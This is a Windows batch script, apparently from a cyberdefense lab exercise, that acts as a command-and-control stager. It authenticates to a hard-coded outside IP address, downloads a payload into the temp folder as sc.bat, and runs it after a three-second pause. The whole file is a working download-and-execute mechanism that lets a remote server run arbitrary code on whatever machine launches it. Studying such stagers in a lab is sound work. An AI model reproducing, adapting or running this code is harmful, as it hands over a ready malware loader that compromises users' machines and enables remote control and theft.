@echo off
setlocal EnableDelayedExpansion
title C2 VirusPracticaAlex - HMAC Stable
color 0A

echo.
echo ╔══════════════════════════════════════════════════════╗
echo ║  🔥 C2 VIRUSPRÁCTICA - HMAC MODE 🔥                  ║
echo ║  Alex Montilla - Ciberdefensa Lab                    ║
echo ╚══════════════════════════════════════════════════════╝
echo.

set "BASE=http://82.29.153.101:8080"
set "FILE=%TEMP%\sc.bat"

echo 🌐 TARGET: %BASE%
echo 📁 OUTPUT: %FILE%
echo.

REM ===== 1. AUTH (NONCE + TOKEN) =====
echo 🔑 [1/3] AUTH...

for /f "tokens=*" %%i in ('curl -s "%BASE%/auth/key"') do (
    set "AUTH=%%i"
    goto :got_auth
)
:got_auth

if not defined AUTH (
    echo    ❌ NO AUTH RESPONSE
    pause
    exit /b 1
)

REM ===== PARSE JSON (simple) =====
for /f "tokens=2 delims=:," %%i in ('echo !AUTH! ^| findstr /i "nonce"') do set NONCE=%%~i
for /f "tokens=2 delims=:," %%i in ('echo !AUTH! ^| findstr /i "token"') do set TOKEN=%%~i

REM limpiar comillas
set NONCE=!NONCE:"=!
set TOKEN=!TOKEN:"=!

if not defined NONCE (
    echo    ❌ NONCE ERROR
    echo    RAW: !AUTH!
    pause
    exit /b 1
)

if not defined TOKEN (
    echo    ❌ TOKEN ERROR
    echo    RAW: !AUTH!
    pause
    exit /b 1
)

echo    ✓ NONCE=!NONCE!
echo    ✓ TOKEN=!TOKEN!
echo.

REM ===== 2. PAYLOAD =====
echo 📥 [2/3] PAYLOAD...

curl -s --max-time 10 ^
  -H "X-Nonce: !NONCE!" ^
  -H "X-Token: !TOKEN!" ^
  "%BASE%/payload/encrypted" ^
  -o "%FILE%"

if errorlevel 1 (
    echo    ❌ DOWNLOAD FAILED
    pause
    exit /b 1
)

if not exist "%FILE%" (
    echo    ❌ FILE NOT CREATED
    pause
    exit /b 1
)

for %%F in ("%FILE%") do set FILESIZE=%%~zF
if !FILESIZE! LSS 5 (
    echo    ❌ EMPTY PAYLOAD
    type "%FILE%"
    pause
    exit /b 1
)

echo    ✓ %FILE% (!FILESIZE! bytes)
echo.

REM ===== 3. PREVIEW + EXEC =====
echo 👁️  [3/3] PREVIEW:
echo    ╔══════
type "%FILE%" | more /e +1 /n 12
echo    ║
echo ⚡  EXECUTANDO en 3s... [Ctrl+C para abortar]
timeout /t 3 /nobreak >nul

echo    → call "%FILE%"
call "%FILE%"

echo.
echo ✅ MISSION COMPLETE ✓
echo 📁 Archivo queda para debug: %FILE%
pause >nul